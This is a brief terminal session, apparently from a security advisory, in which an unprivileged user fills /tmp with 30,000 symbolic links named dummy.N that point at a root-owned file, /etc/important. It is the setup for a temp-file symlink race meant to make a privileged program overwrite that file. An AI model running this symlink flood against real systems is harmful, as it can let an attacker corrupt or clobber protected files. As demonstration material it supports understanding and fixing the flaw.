   $ id
   uid=101(fstuart) gid=14(sysadmin)
   $ cd /tmp
   $ x=0
   $ while [ "$x" -ne 30000 ] ;do
   > ln -s /etc/important /tmp/dummy.$x
   > x=$(expr "$x" + 1)
   > done
   $ ls -dl /etc/important
   -rw-r--r--   1 root     root          38 Jan  3 22:43 /etc/important
   $ cat /etc/important
      This is an important file!

      EOF
